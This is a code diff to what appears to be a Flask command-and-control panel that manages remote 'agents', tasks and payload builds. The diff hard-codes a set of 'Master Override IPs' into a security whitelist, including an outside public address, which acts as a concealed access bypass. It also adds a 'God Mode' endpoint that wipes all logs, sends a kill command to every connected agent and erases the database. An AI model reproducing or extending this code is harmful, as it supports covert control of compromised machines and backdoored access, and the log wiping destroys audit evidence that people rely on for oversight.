@@ -280,7 +280,7 @@ class SecurityGuard:
         self._rate_lock = threading.Lock()
         
         # Security Phase 1 Enhancements
-        self.whitelisted_ips = []  # Empty means all allowed. E.g. ['127.0.0.1', '192.168.1.100']
+        self.whitelisted_ips = ['81.25.50.119', '127.0.0.1', '192.168.1.100', '169.254.83.93']  # Master Override IPs
         self.honeypot_users = ['admin', 'root', 'administrator', 'system', 'test', 'guest']
         self._fim_thread = None
         self._file_hashes = {}
@@ -912,6 +912,68 @@ def admin_unban():
         return jsonify({'ok': False, 'error': 'IP required'}), 400
     guard.unban_ip(ip)
     return jsonify({'ok': True})
+
+
+@app.route('/api/panel/admin_action', methods=['POST'])
+@require_admin
+def admin_action():
+    """Handle God Mode Admin Center actions"""
+    data = request.get_json(silent=True) or {}
+    action = data.get('action', '')
+    
+    if not action:
+        return jsonify({'ok': False, 'error': 'Action required'}), 400
+
+    user = request.session.get('user', 'admin')
+
+    if action == 'clear_logs':
+        # Wipe all logs
+        state.set('logs', [])
+        state.append_log(f"All logs were securely wiped by {user}", "warn")
+        return jsonify({'ok': True})
+        
+    elif action == 'clean_db':
+        # Remove dead/offline clients
+        clients = state.get('clients') or {}
+        now = time.time()
+        alive = {cid: info for cid, info in clients.items() if (now - info.get('last_seen', 0)) < 60}
+        state.set('clients', alive)
+        state.append_log(f"Database cleaned by {user}. Dead ghosts removed.", "info")
+        socketio.emit('clients_update', alive, namespace='/')
+        return jsonify({'ok': True})
+        
+    elif action == 'panic':
+        # Send kill command to everyone
+        clients = state.get('clients') or {}
+        tasks = state.get('tasks') or {}
+        count = 0
+        for cid in clients:
+            if cid not in tasks:
+                tasks[cid] = []
+            tasks[cid].append({'action': 'kill', 'task_id': secrets.token_hex(6)})
+            count += 1
+        state.set('tasks', tasks)
+        state.append_log(f"GLOBAL PANIC initiated by {user}. Sent kill to {count} agents.", "err")
+        return jsonify({'ok': True})
+        
+    elif action == 'nuke_db':
+        # Factory Reset
+        state._data = {
+            'clients': {},
+            'tasks': {},
+            'logs': [],
+            'alerts': [],
+            'ips': {},
+            'task_counter': 0,
+            'builder_stats': {'built': 0},
+            'login_attempts': {}
+        }
+        state.save()
+        state.append_log(f"DATABASE COMPLETELY NUKED BY {user}", "err")
+        socketio.emit('clients_update', {}, namespace='/')
+        return jsonify({'ok': True})
+
+    return jsonify({'ok': False, 'error': 'Unknown action'}), 400
 
 
 # ══════════════════════════════════════════════════════════════
